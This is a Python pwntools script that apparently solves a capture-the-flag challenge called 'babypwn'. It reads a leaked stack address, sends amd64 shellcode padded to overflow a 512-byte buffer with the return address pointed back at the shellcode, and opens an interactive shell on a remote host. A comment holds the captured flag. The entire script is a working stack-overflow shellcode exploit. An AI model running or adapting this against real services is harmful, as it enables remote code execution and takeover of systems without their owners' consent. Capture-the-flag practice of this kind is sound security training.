#!/usr/bin/env python3
from pwn import remote, args, p64, gdb, shellcraft, asm

SHELLCODE = asm(shellcraft.amd64.linux.sh(), arch="x86_64")

if args.REMOTE:
    p = remote("52.59.124.14", 10020)
else:
    p = gdb.debug("./babypwn", gdbscript="""
    b *main
    continue
    """)

p.recvuntil(b"is at: ")
stack = p64(int(p.recvline().strip(), 16))
p.recvuntil(b"\n")
PAYLOAD = SHELLCODE + b"A" * (512 - len(SHELLCODE) + 8) + stack
p.sendline(PAYLOAD)
p.interactive() # ENO{Even_B4B1es_C4n_H4ck!}